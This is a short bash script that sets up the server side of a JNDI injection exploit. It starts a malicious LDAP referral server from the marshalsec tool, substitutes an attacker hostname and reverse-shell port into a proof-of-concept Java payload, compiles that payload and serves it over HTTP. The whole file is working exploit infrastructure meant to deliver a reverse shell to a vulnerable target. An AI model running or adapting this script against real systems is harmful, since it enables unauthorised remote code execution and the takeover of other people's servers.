#!/bin/bash

# start evil ldap server
nohup java -cp marshalsec/target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://${HOSTNAME}:${PAYLOAD_SERVER_PORT}/#poc" ${LDAP_PORT} &

# compile poc with the right host and port
cd poc/ 
sed -i -e "s/REVERSE_SHELL_PORT/${REVERSE_SHELL_PORT}/g" poc.java
sed -i -e "s/HOSTNAME/${HOSTNAME}/g" poc.java
javac poc.java

# start http server for java payloads
python3 -m http.server ${PAYLOAD_SERVER_PORT}
